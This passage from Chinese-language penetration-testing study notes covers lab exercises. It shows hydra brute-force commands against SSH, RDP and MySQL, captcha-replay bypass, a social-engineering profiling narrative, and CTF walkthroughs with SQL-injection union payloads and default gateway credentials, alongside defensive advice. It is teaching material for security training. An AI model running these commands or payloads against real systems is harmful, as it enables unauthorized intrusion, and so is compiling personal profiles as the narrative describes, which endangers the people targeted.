<img src="./images/img_20230718_150936.png" alt="img_20230718_150936.png" width="50%">

</figure>

<p>
安装完成后，看到C盘目录下已经存在OpenSSH文件夹，接下来配置环境变量：
</p>


<figure id="org8eaac81">
<img src="./images/img_20230718_150925.png" alt="img_20230718_150925.png" width="50%">

</figure>



<figure id="org89ced84">
<img src="./images/img_20230718_150955.png" alt="img_20230718_150955.png" width="50%">

</figure>

<p>
配置完成后，在命令行输入ssh，出现下图即代表安装成功：
</p>


<figure id="org718cc0e">
<img src="./images/img_20230718_151012.png" alt="img_20230718_151012.png" width="50%">

</figure>

<p>
在win7下默认安装openssh，账号密码默认是当前系统用户的微软账号和密码。
</p>

<div class="org-src-container">
<pre class="src src-sh">hydra 192.168.108.129 ssh -l win7 -P pwd.txt -t 5 -vV -e nsr -o ssh.log
</pre>
</div>

<p>
破解出账号密码为win7/win7
查看输出的文件也可以发现：
破解出192.168.108.129的SSH账号密码为win7/win7
</p>

<p>
<b>使用hydra暴力破解rdp服务：</b>
</p>

<p>
<a href="https://jingyan.baidu.com/article/63f23628177e6d0209ab3d60.html">win7开启远程桌面</a>
win7 开启远程桌面
</p>
<ul class="org-ul">
<li>点击"计算机"右键属性 &#x2013; 远程设置 &#x2013; 仅允许网络级别用户登录</li>
</ul>


<div class="org-src-container">
<pre class="src src-sh">hydra 192.168.108.129 rdp -l win7 -P pwd.txt -vV -f -e ns
</pre>
</div>

<p>
发现爆破出rdp的账号密码为win7/win7
使用该账户成功登录服务器
</p>

<p>
<b>使用hydra暴力破解Mysql服务：</b>
</p>

<p>
win7系统中启动MySQL服务，查看账号密码：
</p>


<figure id="orgbd6547c">
<img src="./images/img_20230718_151248.png" alt="img_20230718_151248.png" width="50%">

</figure>


<figure id="org34b3202">
<img src="./images/img_20230718_151305.png" alt="img_20230718_151305.png" width="50%">

</figure>

<p>
安装数据库管理工具 sql_from5.3：
</p>


<figure id="orgf2461ab">
<img src="./images/img_20230718_151321.png" alt="img_20230718_151321.png" width="50%">

</figure>


<figure id="org4ae45c6">
<img src="./images/img_20230718_151336.png" alt="img_20230718_151336.png" width="50%">

</figure>

<p>
设置MySQL允许远程连接：
</p>
<ul class="org-ul">
<li>选中 grant all privileges on <b>.</b> to root@'%' identified by 'root'; 语句，点击右键选择运行</li>
</ul>


<figure id="org41fa206">
<img src="./images/img_20230718_151410.png" alt="img_20230718_151410.png" width="50%">

</figure>


<div class="org-src-container">
<pre class="src src-sh">hydra 192.168.108.129 mysql -l root -P pwd.txt -o mysql.log -f -vV -e nsr
</pre>
</div>

<p>
破解出192.168.108.129的mysql的账号密码为：root/root
查看mysql.log也可以看出：192.168.108.129的mysql账号密码为root/root
</p>
</div>
</div>
<div id="outline-container-h:2a7b3ac7-f58f-4cef-a27a-5603055957a0" class="outline-4">
<h4 id="h:2a7b3ac7-f58f-4cef-a27a-5603055957a0">暴力猜解安全防范</h4>
<div class="outline-text-4" id="text-h:2a7b3ac7-f58f-4cef-a27a-5603055957a0">
<ul class="org-ul">
<li>设计安全的验证码（安全的流程+复杂而又可用的图形）。</li>
<li>在前端生成验证码且后端能校验验证码的情况下，对验证码有效期和次数进行限制。</li>
<li>对认证错误的提交进行计数并给出限制，如连续5次密码错误，锁定两小时，验证码用完后立即销毁。</li>
<li>必要的情况下，使用双因子认证（手机验证码、滑动验证码等），利用token防止暴力破解。</li>
</ul>
</div>
</div>
</div>
</section>
<section id="outline-container-h:1bca79e2-437f-487f-ab0b-a0738aa86541" class="outline-2">
<h2 id="h:1bca79e2-437f-487f-ab0b-a0738aa86541">验证码安全</h2>
<div class="outline-text-2" id="text-h:1bca79e2-437f-487f-ab0b-a0738aa86541">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>验证码安全介绍及分类</li>
<li>验证码绕过-on client</li>
<li>验证码绕过-on server</li>
<li>验证码识别攻击还原</li>
</ul>


<p>
所用环境：Pikachu
</p>
</div>
<div id="outline-container-h:b4118d51-68b2-47b7-bd21-f09eb6512de8" class="outline-3">
<h3 id="h:b4118d51-68b2-47b7-bd21-f09eb6512de8">验证码安全介绍及分类</h3>
<div class="outline-text-3" id="text-h:b4118d51-68b2-47b7-bd21-f09eb6512de8">
<p>
在安全领域，验证码主要分为两大类：操作验证码和身份验证码。
</p>

<p>
验证码的主要作用：防止恶意暴力破解、防止恶意注册、刷票、论坛灌水等一切脚本行为。
</p>

<p>
验证码的分类：手机短信、手机语音、通用文字、加减法、非通用文字、非通用文字加背景随机加拉伸、无感知、滑动拼图、文字点选、图标点选、推理拼图、短信上行、语序点选、空间推理、语音验证等等。
</p>
</div>
</div>
<div id="outline-container-h:d75fa00b-41e1-4f49-852e-02ffeaf930dd" class="outline-3">
<h3 id="h:d75fa00b-41e1-4f49-852e-02ffeaf930dd">验证码绕过（on client）</h3>
<div class="outline-text-3" id="text-h:d75fa00b-41e1-4f49-852e-02ffeaf930dd">
<p>
账号枚举作用:
在账号位置使用不存在账号，正确验证码，是为了验证是否有枚举漏洞。再输入个肯定存在的账号，不正确的密码，根据不同提示判断账号是否存在。
</p>

<p>
当未输入验证码的时候，提示“请输入验证码”：
</p>
<ul class="org-ul">
<li>验证验证码是否生效</li>
</ul>


<figure id="org9d7cecb">
<img src="./images/img_20230718_151549.png" alt="img_20230718_151549.png" width="50%">

</figure>

<p>
当输入错误验证码的时候提示“验证码输入错误”：
</p>
<ul class="org-ul">
<li>系统会校验验证码</li>
</ul>


<figure id="org9386841">
<img src="./images/img_20230718_151605.png" alt="img_20230718_151605.png" width="50%">

</figure>

<p>
当输入正确验证码的时候提示“用户名或者密码不存在”：
</p>

<div class="org-src-container">
<pre class="src src-sh">username or password is not exists&#65374;
</pre>
</div>


<figure id="orga55a870">
<img src="./images/img_20230718_151628.png" alt="img_20230718_151628.png" width="50%">

</figure>

<p>
我们尝试截取登录处数据包，修改密码并多次重放之后发现该验证码依然有效，说明可能存在验证码可以重复使用的情况：
</p>
<ul class="org-ul">
<li>burp 抓包，发送到 repeater 模块测试</li>
</ul>


<figure id="orgfc3c707">
<img src="./images/img_20230718_151652.png" alt="img_20230718_151652.png" width="50%">

</figure>


<figure id="orgb9f7cce">
<img src="./images/img_20230718_151718.png" alt="img_20230718_151718.png" width="50%">

</figure>

<p>
于是进行暴力破解，破解出密码为123456：
</p>


<figure id="orgcd135d7">
<img src="./images/img_20230718_151732.png" alt="img_20230718_151732.png" width="50%">

</figure>

<p>
查看前端代码：
</p>


<figure id="orgc10f532">
<img src="./images/img_20230718_151754.png" alt="img_20230718_151754.png" width="50%">

</figure>

<p>
跟进createCode()函数：
</p>


<figure id="org1d61f29">
<img src="./images/img_20230718_151813.png" alt="img_20230718_151813.png" width="50%">

</figure>

<p>
发现造成该验证码重复使用的原因是：验证码是在前端利用JS语句生成和刷新的，我们通过截取数据包进行重放绕过了客户端刷新验证码的机制。
</p>
<ul class="org-ul">
<li>绕过方式：禁用js、删除函数、burp抓包</li>
</ul>
</div>
</div>
<div id="outline-container-h:0156b052-b762-49b6-b2e9-9a5d24b68c14" class="outline-3">
<h3 id="h:0156b052-b762-49b6-b2e9-9a5d24b68c14">验证码绕过（on server）</h3>
<div class="outline-text-3" id="text-h:0156b052-b762-49b6-b2e9-9a5d24b68c14">
<p>
截取登录处的数据包：
</p>


<figure id="org1287e1f">
<img src="./images/img_20230718_151900.png" alt="img_20230718_151900.png" width="50%">

</figure>

<p>
输入错误的验证码返回“验证码错误”：
</p>


<figure id="org8cff6fb">
<img src="./images/img_20230718_151916.png" alt="img_20230718_151916.png" width="50%">

</figure>

<p>
输入正确的验证码返回“用户名或者密码不存在”：
</p>

<div class="org-src-container">
<pre class="src src-sh">username or password is not exists&#65374;
</pre>
</div>


<figure id="org2055fc1">
<img src="./images/img_20230718_152018.png" alt="img_20230718_152018.png" width="50%">

</figure>

<p>
多次更换密码重放之后，服务端仍然返回“用户名或者密码不存在”，证明该验证码依然可以重复使用：
</p>


<figure id="org86f1320">
<img src="./images/img_20230718_152034.png" alt="img_20230718_152034.png" width="50%">

</figure>

<p>
于是仍然可以进行暴力破解，破解出密码为admin/123456：
</p>


<figure id="orgbbb88bb">
<img src="./images/img_20230718_152049.png" alt="img_20230718_152049.png" width="50%">

</figure>

<p>
查看源代码：app\vul\burteforce\bf_server.php
</p>


<figure id="org778e846">
<img src="./images/img_20230718_152102.png" alt="img_20230718_152102.png" width="50%">

</figure>

<p>
造成该验证码重复使用的原因是：验证码在验证之后没有销毁$_SESSION['vcode']，造成了重复使用。
</p>


<figure id="org85d7f68">
<img src="./images/img_20230718_152120.png" alt="img_20230718_152120.png" width="50%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:2ea92b17-6a80-4931-8790-714820282e22" class="outline-2">
<h2 id="h:2ea92b17-6a80-4931-8790-714820282e22">社会工程学（骗）</h2>
<div class="outline-text-2" id="text-h:2ea92b17-6a80-4931-8790-714820282e22">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>社会工程学介绍及敏感信息收集</li>
<li>社工邮件钓鱼分析</li>
<li>APT 攻击简介及攻击方式还原</li>
<li>APT 攻击防范</li>
<li>常规 CTF 比赛题讲解及还原</li>
</ul>
</div>
<div id="outline-container-h:8064f122-1469-496b-a859-f954caf08723" class="outline-3">
<h3 id="h:8064f122-1469-496b-a859-f954caf08723">社会工程学</h3>
<div class="outline-text-3" id="text-h:8064f122-1469-496b-a859-f954caf08723">
<p>
社会工程学（Social Engineering）：是一种通过人际交流的方式获得信息的非技术渗透手段。不幸的是，这种手段非常有效，而且应用效率极高。事实上，社会工程学已是企业安全最大的威胁之一。
</p>

<p>
社工三大法：网络钓鱼、电话钓鱼、伪装模拟
</p>

<p>
社工师的分类：黑客、渗透测试、间谍、特工、gov、公司内部员工、诈骗人员、猎头、销售人员、普通人
</p>

<p>
举例说明：
</p>
<div class="org-src-container">
<pre class="src src-text">&#26576;&#40657;&#23458;&#30693;&#36947;&#20102;&#23567;&#26126;&#30340;&#25163;&#26426;&#21495;&#65292;&#19968;&#33324;&#26469;&#35828;&#65292;&#24456;&#26377;&#21487;&#33021;&#25163;&#26426;&#21495;&#21644;QQ&#21495;&#19968;&#33268;&#65292;&#36827;&#32780;&#25105;&#20204;&#21487;&#20197;&#33719;&#21462;&#23567;&#26126;&#30340;QQ&#26165;&#31216;&#65292; &#23478;&#20065;&#65292;&#24615;&#21035;&#65292;&#24180;&#40836;&#31561;&#19968;&#20123;&#22522;&#26412;&#20449;&#24687;&#12290;&#28982;&#21518;&#36890;&#36807;&#23567;&#26126;&#30340;QQ&#33719;&#21462;&#31354;&#38388;&#20010;&#20154;&#19968;&#20123;&#30456;&#20876;&#65292;&#33258;&#24049;&#21457;&#30340;&#19968;&#20123;&#35828;&#35828;&#65292;&#20889;&#30340;&#19968;&#20123; &#26085;&#24535;&#65292;&#33258;&#24049;&#23545;&#21035;&#20154;&#30340;&#35780;&#35770;&#65292;&#21035;&#20154;&#23545;&#33258;&#24049;&#30340;&#35780;&#35770;&#65292;&#30041;&#35328;&#26495;&#31561;&#20449;&#24687;&#65292;&#36825;&#20123;&#21487;&#20197;&#23545;&#23567;&#26126;&#36827;&#34892;&#32508;&#21512;&#20998;&#26512;&#65292;&#20998;&#26512;&#20986;&#23567;&#26126;&#26159; &#19968;&#20010;&#20160;&#20040;&#26679;&#30340;&#20154;&#12290;&#25509;&#30528;&#36890;&#36807;&#23567;&#26126;&#30340;&#25163;&#26426;&#21495;&#65292;&#33719;&#21462;&#23567;&#26126;&#30340;&#24494;&#20449;&#21495;&#65292;&#36827;&#19968;&#27493;&#33719;&#21462;&#26356;&#22810;&#20010;&#20154;&#20449;&#24687;&#65292;&#20877;&#28982;&#21518;&#36890;&#36807;&#32593;&#31449;&#36941; &#21382;&#33719;&#21462;&#23567;&#26126;&#25152;&#26377;&#27880;&#20876;&#36807;&#30340;&#32593;&#31449;&#65288;&#27604;&#22914;&#25343;&#25163;&#26426;&#21435;&#27880;&#20876;&#65292;&#30475;&#36134;&#21495;&#26159;&#21542;&#24050;&#34987;&#27880;&#20876;&#65289;&#65292;&#36890;&#36807;&#21508;&#20010;&#32593;&#31449;&#36827;&#19968;&#27493;&#33719;&#21462;&#20449;&#24687;&#12290;

&#29616;&#22312;&#35201;&#36827;&#34892;&#28145;&#19968;&#27493;&#30340;&#20102;&#35299;&#20102;&#65292;&#21033;&#29992;&#23567;&#26126;&#29983;&#26085;&#32452;&#21512;&#25110;&#32773;&#21517;&#23383;&#36827;&#34892;&#26292;&#21147;&#30772;&#35299;&#65292;&#30772;&#35299;&#23567;&#26126;&#27880;&#20876;&#30340;&#19968;&#20010;&#22403;&#22334;&#32593;&#31449;&#30340; &#36134;&#21495;&#23494;&#30721;&#65292;&#28982;&#21518;&#30331;&#24405;&#20854;&#20182;&#30340;&#32593;&#31449;&#12290;&#36890;&#24120;&#38450;&#33539;&#24847;&#35782;&#19981;&#39640;&#30340;&#20154;&#21592;&#65292;&#24456;&#22810;&#36134;&#21495;&#23494;&#30721;&#37117;&#26159;&#19968;&#26679;&#12290;&#36890;&#36807;&#36825;&#31181;&#26041;&#27861;&#21487;&#20197;&#33719;&#21462; &#23567;&#26126;&#30340;&#23398;&#21382;&#65292;&#23567;&#26126;&#30340;&#25152;&#26377;&#22909;&#21451;&#21450;&#20854;&#22995;&#21517;&#65292;&#36824;&#26377;&#21644;&#21035;&#20154;&#30340;&#32842;&#22825;&#35760;&#24405;&#65292;&#29616;&#22312;&#24320;&#22987;&#26377;&#20132;&#38598;&#20102;&#65292;&#36827;&#32780;&#23545;&#20854;&#20182;&#20154;&#36827;&#34892;&#25910; &#38598;&#12290;&#26368;&#21518;&#25226;&#23567;&#26126;&#30340;&#25152;&#26377;&#25910;&#38598;&#21040;&#30340;&#20449;&#24687;&#36827;&#34892;&#23545;&#27604;&#21644;&#25972;&#29702;&#65292;&#25484;&#25569;&#23567;&#26126;&#30340;&#22522;&#26412;&#20449;&#24687;&#65292;&#21487;&#20197;&#36827;&#34892;&#36137;&#21334;&#12290;

  &#23436;&#25104;&#19968;&#20010;&#30446;&#26631;&#20154;&#30340;&#22522;&#26412;&#30011;&#20687;&#65292;&#23545;&#25915;&#20987;&#20154;&#21592;&#30340;&#20449;&#24687;&#28335;&#28304;&#12290;
</pre>
</div>

<p>
<b>分析，小明的信息是如何泄露的？</b>
</p>

<p>
有以下可能：
1、小明注册过太多的网站，网站被黑客攻击，黑客获取到个人信息
2、小明各个系统、软件、程序使用的密码相同
3、小明不经常修改密码，导致多年前的社工库密码依然有效等等
</p>
</div>
</div>
<div id="outline-container-h:ea56e3f8-50fd-4358-a0f1-e4c043989364" class="outline-3">
<h3 id="h:ea56e3f8-50fd-4358-a0f1-e4c043989364">敏感信息收集</h3>
<div class="outline-text-3" id="text-h:ea56e3f8-50fd-4358-a0f1-e4c043989364">
<p>
渗透测试的本质是信息收集，对于标准的渗透测试人员来说，当明确目标做好规划之后首先应当进行的便是信息收集，收集内容包括但不限于IP地址段、域名信息、邮件地址、文档图片数据、公司地址、公司组织架构、联系电话/传真号码、人员姓名/职务、目标系统使用的技术架构、公开的商业信息等等。
</p>

<p>
收集的信息越多，越能够更轻松的进行渗透测试。
</p>

<p>
1、whois收集
</p>

<p>
Whois可以用来查询域名是否已经被注册，如果已经注册，将会查询域名的详细信息，比如:域名注册商、域名注册日期、域名注册人联系方式等。
</p>

<p>
whois查询接口
<a href="https://api.devopsclub.cn/">https://api.devopsclub.cn/</a>
<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a>
<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a>
<a href="http://whoissoft.com/">http://whoissoft.com/</a>
<a href="https://whois.domain.cn/">https://whois.domain.cn/</a>
等等
</p>

<p>
2、爬虫
</p>

<p>
网络爬虫是一种按照一定的规则自动地抓取万维网信息的程序或脚本。当我们想获取迫切需要的信息时，就需要用到搜索，通过一些搜索引擎来获取信息的链接。
</p>

<p>
爬虫工具：AWVS，Burpsuite，rad
</p>

<p>
3、搜索引擎
</p>

<p>
多种搜索语法可以更快速地找到想要的内容。Google是全球最大的搜索引擎公司，每天处理数以亿计的搜索请求。灵活运用Google搜索技巧可以帮助我们更快速、更准确地在浩瀚的互联网中找到需要的信息
</p>

<p>
inurl：搜索包含有特定字符的URL。例如，输入“inurl:hack”，则可以找到带有hack字符的URL。
intitle：搜索网页标题中包含有特定字符的网页。例如，输入“intitle:网络空间安全”，这样就能找到网页标题中带有网络空间安全的网页。
site：限制搜索的域名范围。例如，输入“site:xxx.com”，就可以只搜索域名为 xxx.com的网页。
filetype：搜索指定类型的文件。例如，想要下载 Word 文档，那么只要输入“filetype:doc(docx)”，就可以找到很多Word文档。
</p>

<p>
4、Nmap：是一款用于网络发现和安全审计的网络安全工具
5、DNS分析：使用工具DNSenum以及Maltego
6、指纹识别：web指纹，系统指纹，中间件指纹，防火墙指纹
7、邮箱收集：通过收集邮箱爆破邮件服务器，发送钓鱼邮件，执行高级APT控制
8、子域名收集：爆破，第三方接口，SSL证书，域传送等
9、C段收集：利用nmap，masscan等端口扫描工具进行端口扫描
10、社工库：寻找目标已经泄露的数据
等等
</p>
</div>
</div>
</section>
<section id="outline-container-h:57853d75-9165-48c0-a637-34c9a24ee880" class="outline-2">
<h2 id="h:57853d75-9165-48c0-a637-34c9a24ee880">APT攻击</h2>
<div class="outline-text-2" id="text-h:57853d75-9165-48c0-a637-34c9a24ee880">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>APT 攻击简介及攻击方式还原</li>
<li>APT 攻击防范</li>
</ul>
</div>
<div id="outline-container-h:9b64824f-2e93-4025-88f1-4b9766255d5e" class="outline-3">
<h3 id="h:9b64824f-2e93-4025-88f1-4b9766255d5e">APT概述</h3>
<div class="outline-text-3" id="text-h:9b64824f-2e93-4025-88f1-4b9766255d5e">
</div>
<div id="outline-container-h:e1803a1d-6318-41d3-8ab6-1049d0c7eeac" class="outline-4">
<h4 id="h:e1803a1d-6318-41d3-8ab6-1049d0c7eeac">APT简介</h4>
<div class="outline-text-4" id="text-h:e1803a1d-6318-41d3-8ab6-1049d0c7eeac">
<p>
APT（Advanced Persistent Threat）即高级持续性威胁，是一种周期较长、隐蔽性极强的攻击模式。攻击者精心策划，长期潜伏在目标网络中，搜集攻击目标的各种信息，如业务流程、系统运行状况等，伺机发动攻击，窃取目标核心资料。
</p>

<p>
<b>APT攻击常用手段：</b>
</p>

<p>
1、水坑攻击（Watering Hole）
攻击者会在攻击前搜集大量目标的信息，分析其网络活动的规律，寻找其经常访问的网站弱点，并事先攻击该网站，等待目标来访，伺机进行攻击。
</p>

<p>
2、路过式下载（Drive-by Download）
</p>

<p>
在用户不知情的情况下，下载间谍软件、计算机病毒或任何恶意软件。被攻击的目标在访问一个网站、浏览电子邮件或是在单击一些欺骗性的弹出窗口时，可能就被安装了恶意软件。
</p>

<p>
3、网络钓鱼和鱼叉式网络钓鱼（Phishing and Spear Phishing）
</p>

<p>
攻击者企图通过网络通信，伪装成一些知名的社交网站、政府组织、金融机构等来获取用户的敏感信息。
</p>

<p>
4、0day漏洞（Zero-day Exploit）
</p>

<p>
0day漏洞：漏洞是客观存在的，只是在场面上没有被发现纰漏。
</p>

<p>
攻击者在进入目标网络后，可轻易利用零日漏洞对目标进行攻击，轻松获取敏感数据。
</p>

<p>
<b>APT攻击主要分为6个阶段：</b>
</p>
<ol class="org-ol">
<li>情报收集</li>
<li>单点突破：打开薄弱点实施单点突破</li>
<li>命令与控制(C&amp;C通信)</li>
<li>横向渗透：类似SSRF，拿下服务器做横向突破</li>
<li>资产/资料发掘</li>
<li>资料窃取</li>
</ol>
</div>
</div>
<div id="outline-container-h:ccb00898-6592-4f05-af9c-c264e1f15e92" class="outline-4">
<h4 id="h:ccb00898-6592-4f05-af9c-c264e1f15e92">APT攻击方式还原</h4>
<div class="outline-text-4" id="text-h:ccb00898-6592-4f05-af9c-c264e1f15e92">
<p>
黑客通过踩点目标，收集到目标A的手机号188XXXXXXXX
</p>

<p>
于是通过社工的手段获取到了A的QQ号，于是黑客给A发送了一封钓鱼邮件，邮件内容如下：
</p>


<figure id="org20b7fcf">
<img src="./images/img_20230718_152707.png" alt="img_20230718_152707.png" width="50%">

</figure>

<p>
由于A的安全意识薄弱导致，点击了参考附件中的木马，导致个人终端被黑客进行了控制
</p>


<figure id="orge044ba6">
<img src="./images/img_20230718_152742.png" alt="img_20230718_152742.png" width="50%">

</figure>

<p>
黑客通过在公司内网潜伏数日，横向渗透获取了公司重要的服务器系统控制权限，拿到了自己想要的信息
</p>


<figure id="org9d6333f">
<img src="./images/img_20230718_152758.png" alt="img_20230718_152758.png" width="50%">

</figure>
</div>
</div>
</div>
<div id="outline-container-h:7962804d-7525-4d4e-a7bd-9a5348575e1a" class="outline-3">
<h3 id="h:7962804d-7525-4d4e-a7bd-9a5348575e1a">APT攻击防范</h3>
<div class="outline-text-3" id="text-h:7962804d-7525-4d4e-a7bd-9a5348575e1a">
<ul class="org-ul">
<li>恶意代码检测
基于特征码的检测：通过对恶意代码的静态分析，找到该恶意代码中具有代表性的特征信息（指纹），如十六进制的字节序列、字符串序列等，然后再利用该特征进行快速匹配。
基于启发式的检测：通过对恶意代码的分析获得恶意代码执行中通用的行为操作序列或结构模式，若行为操作序列或结构模式的加权值总和超过某个指定的阈值，即判定为恶意代码。</li>
<li>主机应用保护
加强系统内各主机节点的安全措施，确保员工个人电脑以及服务器的安全。</li>
<li>网络入侵检测
APT攻击恶意代码所构建的命令控制通道通信模式一般来说不经常变化，采用传统入侵检测方法来检测APT的命令控制通道</li>
<li>大数据分析检测
采集网络设备的原始流量及终端和服务器日志，进行集中的海量数据存储和深入分析，发现APT攻击的蛛丝马迹后，通过全面分析海量日志数据来还原APT攻击场景。</li>
</ul>
</div>
</div>
</section>
<section id="outline-container-h:5b8d9a7c-261b-43ee-afb7-86ebfc98c398" class="outline-2">
<h2 id="h:5b8d9a7c-261b-43ee-afb7-86ebfc98c398">常规CTF赛题讲解</h2>
<div class="outline-text-2" id="text-h:5b8d9a7c-261b-43ee-afb7-86ebfc98c398">
<p>
CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式，已经成为全球范围网络安全圈流行的竞赛形式。
</p>

<p>
2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，也成为了全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。 现在国家愈发重视CTF，每年都会有一些大型的比赛，汇聚了全国各地的网安人才，比如网鼎杯，强网杯，陇剑杯等等。
</p>

<p>
比赛形式
</p>
<ol class="org-ol">
<li>理论赛</li>
<li>夺旗赛：Crypto、Web、MISC、Reverse、PWN</li>
<li>AWD网络攻防赛（团队赛，混战）</li>
<li>CFS网络攻防赛（团队赛，综合靶场）</li>
</ol>

<p>
这里，关注Web渗透测试，所涉及的常见CTF比赛题目如下：
</p>

<p>
所用环境：在线平台 <a href="https://www.ctfhub.com">https://www.ctfhub.com</a>
注册一个账号
登录系统后，点击技能树，可以看到各类题型
</p>
</div>
<div id="outline-container-h:9b6a27d5-4bec-43ab-ac2b-e4c33456187a" class="outline-3">
<h3 id="h:9b6a27d5-4bec-43ab-ac2b-e4c33456187a">Web-信息泄露</h3>
<div class="outline-text-3" id="text-h:9b6a27d5-4bec-43ab-ac2b-e4c33456187a">
<p>
信息泄露之PHPINFO
</p>


<figure id="orgde13b3b">
<img src="./images/img_20230718_153127.png" alt="img_20230718_153127.png" width="50%">

</figure>

<p>
访问启动的环境链接
</p>

<p>
点击查看phpinfo
</p>


<figure id="org1cab4dc">
<img src="./images/img_20230718_153141.png" alt="img_20230718_153141.png" width="50%">

</figure>

<p>
搜索flag发现flag：ctfhub{fa0f2cd9417bcbe4188d333f}
提交flag解题成功
</p>
</div>
</div>
<div id="outline-container-h:a2f926af-741d-467b-a028-8e4af9ca13c3" class="outline-3">
<h3 id="h:a2f926af-741d-467b-a028-8e4af9ca13c3">Web-密码口令</h3>
<div class="outline-text-3" id="text-h:a2f926af-741d-467b-a028-8e4af9ca13c3">
<p>
默认口令
</p>


<figure id="org3b57e3f">
<img src="./images/img_20230718_153342.png" alt="img_20230718_153342.png" width="50%">

</figure>

<p>
开启题目
访问链接
发现是亿邮邮件网关系统
</p>


<figure id="orgd404559">
<img src="./images/img_20230718_153409.png" alt="img_20230718_153409.png" width="50%">

</figure>

<p>
通过搜索引擎可以搜索到该系统的默认账号密码有三个：
</p>

<p>
<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0106514">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0106514</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">admin/+-ccccc
eyougw/admin@(eyou)
eyouuser/eyou_admin
</pre>
</div>

<p>
利用eyougw/admin@(eyou)成功登录系统，发现flag
</p>


<figure id="orgcbe8935">
<img src="./images/img_20230718_153523.png" alt="img_20230718_153523.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:43f83cfb-e13d-4034-93ca-18897f6e78d4" class="outline-3">
<h3 id="h:43f83cfb-e13d-4034-93ca-18897f6e78d4">Web-SQL注入</h3>
<div class="outline-text-3" id="text-h:43f83cfb-e13d-4034-93ca-18897f6e78d4">
<p>
选一个字符型注入
</p>


<figure id="orgdc80217">
<img src="./images/img_20230718_163613.png" alt="img_20230718_163613.png" width="50%">

</figure>

<p>
启动环境，打开链接
输入1试试？
回显：
知道了sql语句是：select * from news where id='1'
还有两处内容
ID: 1
Data: ctfhub
</p>


<figure id="orgc3adb11">
<img src="./images/img_20230718_163545.png" alt="img_20230718_163545.png" width="50%">

</figure>

<p>
构造语句
1' order by 2 # 回显
</p>


<figure id="org0f99a51">
<img src="./images/img_20230718_163649.png" alt="img_20230718_163649.png" width="50%">

</figure>

<p>
1' order by 3 # 不回显，判断出数据库语句查询了两列
</p>


<figure id="orgf6e1397">
<img src="./images/img_20230718_163700.png" alt="img_20230718_163700.png" width="50%">

</figure>

<p>
进行联合查询，将前面置为-1
-1' union select database(),2 #
获取数据库名字为sqli
</p>


<figure id="org4c1d4fb">
<img src="./images/img_20230718_163715.png" alt="img_20230718_163715.png" width="50%">

</figure>

<p>
查找库里面的所有表名
</p>

<div class="org-src-container">
<pre class="src src-sh">-1<span style="color: #8b2252;">' union select group_concat(table_name),2 from information_schema.tables where table_schema='</span>sqli<span style="color: #8b2252;">' #</span>
</pre>
</div>

<p>
发现flag表
</p>


<figure id="orgd6e60f4">
<img src="./images/img_20230718_163756.png" alt="img_20230718_163756.png" width="50%">

</figure>

<p>
查flag表里的所有字段
</p>

<div class="org-src-container">
<pre class="src src-sh">-1<span style="color: #8b2252;">' union select group_concat(column_name) ,2 from information_schema.columns where table_name='</span>flag<span style="color: #8b2252;">' #</span>
</pre>
</div>

<p>
发现flag字段
</p>


<figure id="org4e5101c">
<img src="./images/img_20230718_163813.png" alt="img_20230718_163813.png" width="50%">

</figure>

<p>
-1' union select flag,2 from sqli.flag #
查字段flag的内容得到flag
</p>


<figure id="orgc83cbbe">
<img src="./images/img_20230718_163843.png" alt="img_20230718_163843.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:94aba906-455c-41c7-8a98-7d3c6ae51122" class="outline-3">
<h3 id="h:94aba906-455c-41c7-8a98-7d3c6ae51122">Crypto-base</h3>
<div class="outline-text-3" id="text-h:94aba906-455c-41c7-8a98-7d3c6ae51122">

<figure id="orgaa0d6b1">
<img src="./images/img_20230718_163916.png" alt="img_20230718_163916.png" width="50%">

</figure>

<p>
古典密码
</p>


<figure id="orgdda77ed">
<img src="./images/img_20230718_163928.png" alt="img_20230718_163928.png" width="50%">

</figure>

<p>
base系列，网站目前没有提供环境
</p>


<figure id="org891a74b">
<img src="./images/img_20230718_163942.png" alt="img_20230718_163942.png" width="50%">

</figure>

<p>
取之前做过的题目附件，题目如下：
V1ROU2JXRklWbWxsTTJ4MlpGTkNhR050VldkamJXeHVZVWhTT1E9PQ==
</p>

<p>
大写字母、小写字母、数字、+、/
</p>

<p>
该加密字符串结尾处有等号，判断是base加密，经过base64三次解密，得到flag
</p>
</div>
</div>
<div id="outline-container-h:9c2a9d84-7f68-4a9e-aa09-cdc7ea45d689" class="outline-3">
<h3 id="h:9c2a9d84-7f68-4a9e-aa09-cdc7ea45d689">MISC-数据隐写</h3>
<div class="outline-text-3" id="text-h:9c2a9d84-7f68-4a9e-aa09-cdc7ea45d689">

<figure id="org3eb8f72">
<img src="./images/img_20230718_164034.png" alt="img_20230718_164034.png" width="50%">

</figure>

<p>
数据隐写
</p>


<figure id="org6087ef1">
<img src="./images/img_20230718_164045.png" alt="img_20230718_164045.png" width="50%">

</figure>

<p>
图片隐写
</p>


<figure id="org7c9bbcb">
<img src="./images/img_20230718_164141.png" alt="img_20230718_164141.png" width="50%">

</figure>

<ul class="org-ul">
<li>图片隐写分析工具stegsolve： <a href="http://www.caesum.com/handbook/Stegsolve.jar">http://www.caesum.com/handbook/Stegsolve.jar</a></li>
</ul>
</div>
<div id="outline-container-h:76f84112-ccc7-4b5c-a960-d2775189c54b" class="outline-4">
<h4 id="h:76f84112-ccc7-4b5c-a960-d2775189c54b">简单隐写</h4>
<div class="outline-text-4" id="text-h:76f84112-ccc7-4b5c-a960-d2775189c54b">

<figure id="orgd36bcfa">
<img src="./images/img_20230718_164155.png" alt="img_20230718_164155.png" width="50%">

</figure>

<p>
开启题目，不同于web题，杂项类题目会提供一个题目附件，下载之后通常是一个压缩包：
</p>


<figure id="org416db10">
<img src="./images/img_20230718_164222.png" alt="img_20230718_164222.png" width="50%">

</figure>

